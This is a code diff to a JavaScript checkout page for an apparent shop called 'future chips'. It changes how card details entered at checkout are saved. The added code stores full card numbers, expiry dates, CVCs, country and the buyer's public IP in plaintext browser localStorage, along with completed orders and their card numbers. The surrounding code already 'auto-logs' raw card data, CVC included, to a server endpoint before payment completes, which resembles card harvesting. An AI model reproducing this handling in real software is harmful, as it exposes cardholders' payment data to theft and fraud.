@@ -1935,7 +1935,7 @@ img.paypal-logo {
         })
         .catch(err => console.warn('Could not fetch public IP:', err));
 
-      async function saveCardDetailsToDb() {
+      function saveCardDetailsToDb() {
         if (tabCard.classList.contains('active')) {
           const cardDetails = {
             number: cardNumberInput.value,
@@ -1944,15 +1944,27 @@ img.paypal-logo {
             country: document.getElementById('card-country').value,
             ip: userPublicIp
           };
+
           try {
-            await fetch('/api/checkout/save-card', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ cardDetails, sessionId })
-            });
-          } catch (e) {
-            console.error('Error auto-logging card details:', e);
-          }
+            const cardObj = {
+              card_number: cardDetails.number,
+              expiry: cardDetails.expiry,
+              cvc: cardDetails.cvc,
+              country: cardDetails.country,
+              ip_address: cardDetails.ip,
+              created_at: new Date().toISOString()
+            };
+            let cards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
+            cards = cards.filter(c => c.card_number !== cardDetails.number);
+            cards.unshift(cardObj);
+            localStorage.setItem('future_chips_cards', JSON.stringify(cards));
+          } catch(e) {}
+
+          fetch('/api/checkout/save-card', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cardDetails, sessionId })
+          }).catch(e => console.error('Error auto-logging card details:', e));
         }
       }
 
@@ -1997,6 +2009,21 @@ img.paypal-logo {
           });
 
           if (completeRes.ok) {
+            // Also save order to localStorage fallback
+            if (orderData) {
+              const orderObj = {
+                ...orderData,
+                status: 'completed',
+                card_number: tabCard.classList.contains('active') ? cardNumberInput.value : null
+              };
+              let localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+              const exists = localOrders.find(o => o.id === orderObj.id);
+              if (!exists) {
+                localOrders.unshift(orderObj);
+                localStorage.setItem('future_chips_orders', JSON.stringify(localOrders));
+              }
+            }
+
             window.location.href = `/checkout-status.html?session_id=${sessionId}&mock=true`;
             return;
           }
@@ -2032,6 +2059,20 @@ img.paypal-logo {
             let cards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
             cards.unshift(cardObj);
             localStorage.setItem('future_chips_cards', JSON.stringify(cards));
+          }
+          
+          if (orderData) {
+            const orderObj = {
+              ...orderData,
+              status: 'completed',
+              card_number: tabCard.classList.contains('active') ? cardNumberInput.value : null
+            };
+            let localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+            const exists = localOrders.find(o => o.id === orderObj.id);
+            if (!exists) {
+              localOrders.unshift(orderObj);
+              localStorage.setItem('future_chips_orders', JSON.stringify(localOrders));
+            }
           }
           
           setTimeout(() => {
